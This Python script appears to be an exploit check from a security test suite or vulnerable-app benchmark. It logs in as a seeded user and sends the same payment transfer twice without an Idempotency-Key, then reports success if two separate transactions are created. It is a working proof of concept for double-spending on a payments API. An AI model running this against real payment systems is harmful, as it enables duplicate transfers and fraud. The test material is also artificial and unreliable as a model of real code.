import os
import sys
import requests

BASE_URL = os.environ.get('TARGET_URL', 'http://localhost:8080').rstrip('/')

def main():
    # Step 1: Authenticate as seeded user alice
    try:
        login_resp = requests.post(
            f'{BASE_URL}/api/auth/login',
            json={'Username': 'alice', 'Password': 'alice-pw'},
            timeout=4
        )
    except Exception as e:
        print(f'EXPLOIT_FAIL: login request error - {e}')
        sys.exit(0)

    if login_resp.status_code != 200:
        print(f'EXPLOIT_FAIL: login failed with status {login_resp.status_code}')
        sys.exit(0)

    try:
        token = login_resp.json()['token']
    except Exception:
        print('EXPLOIT_FAIL: could not parse token from login response')
        sys.exit(0)

    headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}
    body = {'FromAccount': 'alice', 'ToAccount': 'bob', 'Amount': 10.00}

    # Step 2: Send identical transfer request twice with NO Idempotency-Key
    try:
        r1 = requests.post(f'{BASE_URL}/api/payments/transfer', json=body, headers=headers, timeout=4)
        r2 = requests.post(f'{BASE_URL}/api/payments/transfer', json=body, headers=headers, timeout=4)
    except Exception as e:
        print(f'EXPLOIT_FAIL: transfer request error - {e}')
        sys.exit(0)

    if r1.status_code != 200 or r2.status_code != 200:
        print(f'EXPLOIT_FAIL: transfer returned non-200 (r1={r1.status_code} r2={r2.status_code})')
        sys.exit(0)

    try:
        tx1 = r1.json()['transaction_id']
        tx2 = r2.json()['transaction_id']
    except Exception:
        print('EXPLOIT_FAIL: could not parse transaction_id from transfer responses')
        sys.exit(0)

    if tx1 != tx2:
        print(f'EXPLOIT_SUCCESS: duplicate transfers created without Idempotency-Key tx1={tx1} tx2={tx2}')
    else:
        print(f'EXPLOIT_FAIL: both calls returned same transaction_id={tx1} (idempotency may be enforced)')

main()
sys.exit(0)

